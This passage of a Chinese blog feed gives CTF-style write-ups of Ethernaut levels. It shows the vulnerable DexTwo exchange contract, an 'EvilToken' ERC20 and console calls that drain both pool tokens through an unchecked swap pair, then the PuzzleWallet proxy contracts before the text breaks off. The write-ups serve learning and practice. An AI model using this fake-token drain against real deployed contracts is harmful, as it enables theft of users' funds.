keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/access/Ownable.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">DexTwo</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> token1<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> token2<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">setTokens</span><span class="token punctuation">(</span><span class="token builtin">address</span> _token1<span class="token punctuation">,</span> <span class="token builtin">address</span> _token2<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>        token1 <span class="token operator">=</span> _token1<span class="token punctuation">;</span>        token2 <span class="token operator">=</span> _token2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">add_liquidity</span><span class="token punctuation">(</span><span class="token builtin">address</span> token_address<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span>token_address<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"Not enough to swap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> swapAmount <span class="token operator">=</span> <span class="token function">getSwapAmount</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">getSwapAmount</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token function">SwappableTokenTwo</span><span class="token punctuation">(</span>token1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SwappableTokenTwo</span><span class="token punctuation">(</span>token2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">SwappableTokenTwo</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">private</span> _dex<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> dexInstance<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> name<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> symbol<span class="token punctuation">,</span> <span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span>        <span class="token function">ERC20</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span>        _dex <span class="token operator">=</span> dexInstance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> _dex<span class="token punctuation">,</span> <span class="token string">"InvalidApprover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        super<span class="token punctuation">.</span><span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目要求将合约里的两个 token 数量全部取出，允许自己发行自定义 token</p><h4 id="analyse-10"><a class="markdownIt-Anchor" href="#analyse-10"></a> Analyse</h4><p>本官swap函数没有</p><p>require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), “Invalid tokens”);</p><p>这句话做检查，说明攻击者允许出售任意一个from代币从Dex中获得真正的to代币，可以新的代币合约</p><p>那么我们只需要发送一个faketoken到dex合约，我们就可以交换100个faketoken来换回token1，然后重复操作换回token2即可</p><table><thead><tr><th style="text-align:left"></th><th style="text-align:left"></th><th style="text-align:left">token1</th><th style="text-align:left">token2</th><th style="text-align:left">token3</th></tr></thead><tbody><tr><td style="text-align:left">initialize</td><td style="text-align:left">pool</td><td style="text-align:left">100</td><td style="text-align:left">100</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">10</td><td style="text-align:left">10</td><td style="text-align:left">3</td></tr><tr><td style="text-align:left">token3-&gt;token1: 1</td><td style="text-align:left">pool</td><td style="text-align:left">0</td><td style="text-align:left">100</td><td style="text-align:left">2</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">100</td><td style="text-align:left">10</td><td style="text-align:left">2</td></tr><tr><td style="text-align:left">token3-&gt;token2: 2</td><td style="text-align:left">pool</td><td style="text-align:left">0</td><td style="text-align:left">0</td><td style="text-align:left">4</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">100</td><td style="text-align:left">100</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">主要是利用价格计算公式</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">getSwapAmount</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="attack-9"><a class="markdownIt-Anchor" href="#attack-9"></a> Attack</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.20</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">EvilToken</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">"EvilToken"</span><span class="token punctuation">,</span> <span class="token string">"EVL"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后对目标合约进行授权以及转账</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/1.png" alt></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//注意：在转账后要刷新页面，要不然页面反应不过来</span><span class="token comment">// 定义token变量</span><span class="token keyword">const</span> token1 <span class="token operator">=</span> <span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">token1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> token2 <span class="token operator">=</span> <span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">token2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> token3 <span class="token operator">=</span> <span class="token string">"0xe112b308b78cafc6aee31de26f5331b7a414ec14"</span><span class="token comment">// 部署合约的地址</span><span class="token comment">// 分别调用swap方法</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>token3<span class="token punctuation">,</span>token1<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">// 调用完以后池子里token3的数量为2，所以下次调用需要用两个token2来兑换token2</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>token3<span class="token punctuation">,</span>token2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">// 分别查看执行完池子中token1和token2的数量</span><span class="token punctuation">(</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>token1<span class="token punctuation">,</span>instance<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">(</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>token2<span class="token punctuation">,</span>instance<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="puzzle-wallet"><a class="markdownIt-Anchor" href="#puzzle-wallet"></a> Puzzle Wallet</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">pragma</span> experimental ABIEncoderV2<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"../helpers/UpgradeableProxy-08.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">PuzzleProxy</span> <span class="token keyword">is</span> UpgradeableProxy <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> pendingAdmin<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> admin<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _admin<span class="token punctuation">,</span> <span class="token builtin">address</span> _implementation<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _initData<span class="token punctuation">)</span>        <span class="token function">UpgradeableProxy</span><span class="token punctuation">(</span>_implementation<span class="token punctuation">,</span> _initData<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        admin <span class="token operator">=</span> _admin<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">modifier</span> <span class="token function">onlyAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> admin<span class="token punctuation">,</span> <span class="token string">"Caller is not the admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">proposeNewAdmin</span><span class="token punctuation">(</span><span class="token builtin">address</span> _newAdmin<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>        pendingAdmin <span class="token operator">=</span> _newAdmin<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">approveNewAdmin</span><span class="token punctuation">(</span><span class="token builtin">address</span> _expectedAdmin<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyAdmin <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>pendingAdmin <span class="token operator">==</span> _expectedAdmin<span class="token punctuation">,</span> <span class="token string">"Expected new admin by the current admin is not the pending admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        admin <span class="token operator">=</span> pendingAdmin<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">upgradeTo</span><span class="token punctuation">(</span><span class="token builtin">address</span> _newImplementation<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyAdmin <span class="token punctuation">&#123;</span>        <span class="token function">_upgradeTo</span><span class="token punctuation">(</span>_newImplementation<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">PuzzleWallet</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> maxBalance<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token keyword">public</span> whitelisted<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _maxBalance<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>maxBalance <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Already initialized"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        maxBalance <span class="token operator">=</span> _maxBalance<span class="token punctuation">;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">modifier</span> <span class="token function">onlyWhitelisted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>whitelisted<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Not whitelisted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">setMaxBalance</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _maxBalance<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyWhitelisted <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Contract balance is not 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        maxBalance <span class="token operator">=</span> _maxBalance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">addToWhitelist</span><span class="token punctuation">(</span><span class="token builtin">address</span> addr<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">"Not the owner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        whitelisted<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">&lt;=</span> maxBalance<span class="token punctuation">,</span> <span class="token string">"Max balance reached"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> value<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">calldata</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> value<span class="token punctuation">,</span> <span class="token string">"Insufficient balance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> value<span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> to<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> value<span class="token punctuation">&#125;</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"Execution failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">multicall</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">calldata</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">&#123;</span>        <span class="token builtin">bool</span> depositCalled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _data <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token builtin">bytes4</span> selector<span class="token punctuation">;</span>            <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span>                selector <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>_data<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>selector <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deposit<span class="token punctuation">.</span>selector<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>depositCalled<span class="token punctuation">,</span> <span class="token string">"Deposit can only be called once"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// Protect against reusing msg.value</span>                depositCalled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"Error while delegating call"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CREATE2</title>
      <link href="/2023/11/21/CREATE2/"/>
      <url>/2023/11/21/CREATE2/</url>
      
